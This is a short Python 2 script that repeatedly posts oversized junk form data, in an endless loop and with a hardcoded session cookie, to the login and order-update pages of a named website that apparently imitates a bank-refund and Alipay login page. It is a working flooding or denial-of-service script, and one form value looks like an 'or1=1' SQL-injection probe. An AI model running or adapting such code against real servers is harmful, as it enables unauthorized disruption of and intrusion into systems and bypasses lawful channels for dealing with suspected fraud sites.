#coding:utf-8
'''
Created on May 3, 2018

@author: root
'''
import urllib,urllib2
#/index.php/home/index/updateorder2.html
url_root=r'http://cgysmt.cn.com'
url_first=r'http://cgysmt.cn.com/index.php?sel=C5C9CD3B9ED5709BA5B89D1DC8139D6B&from=singlemessage'
url_secon=r'http://cgysmt.cn.com/index.php/home/index/refundmoneyn.html?siteid=13&orderid=220&bank_id=1'

url_banksub=r'http://cgysmt.cn.com/index.php/home/index/updateorder2.html'


def sedreq(urld, datd):
    headers = { 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36' ,\
               'Cookie': r'PHPSESSID=iepdnmp1qc7crp019qhjmee1p6'}  
    #headers['Cookie']=r'UM_distinctid=16295165d77b8-066969d905fab7-3a76015a-1fa400-16295165d787e4; 37cs_user=37cs60026302580; 37cs_show=253; CNZZDATA1260535040=169648380-1522918900-http%253A%252F%252Fwww.dytt8.net%252F%7C1523448119; cscpvcouplet4298_fidx=4; cscpvrich5041_fidx=4'

    req = urllib2.Request(urld,datd,headers)#req = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(req)
    tepstr=response.read()
    print tepstr
    return tepstr
    pass
#

def formdataa():
    kep={}
    strt=r'orderid=211&bankcard_type=1&cname=asdfasf&idtype=%E8%BA%AB%E4%BB%BD%E8%AF%81&idetn=&cardnb=asdfdasf&pwd1=asdf&pwd2=asdf&pwd_zhifu=&phone=asf&month='
    for i in strt.split('&'):
        tp=i.split('=')
        kep[tp[0]]=tp[-1]
        
    kep['bankcard_type']='1asdf'*100000
        
    print urllib.urlencode(kep)
    return urllib.urlencode(kep)
    
    
url_login=r'http://cgysmt.cn.com/index.php/home/index/login.html'

def formdatab():
    origin=r'ua=&TPL_key=1520517992&TPL_token=30000007&websel=zfb&siteid=13&yumingid=29%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD&TPL_username=adsg&TPL_password=asdf'
    kep={}
    tep=r'ua=&TPL_key=aaa&TPL_token=ff&websel=zfb&siteid=13&yumingid=sdfor1=1&TPL_username=adsg&TPL_password=asdf'
    for i in tep.split('&'):
        tp=i.split('=')
        kep[tp[0]]=tp[-1]
        
    
    for i in ['ua','TPL_key','TPL_token','websel','yumingid','TPL_username','TPL_password']:
        kep[i]='100'*10000
  
        

    print urllib.urlencode(kep)
    return urllib.urlencode(kep)
    
if __name__ == '__main__':
    while(1):
        sedreq(url_banksub, formdataa())
        sedreq(url_login, formdatab())
    
    print 'done!!!1'
    pass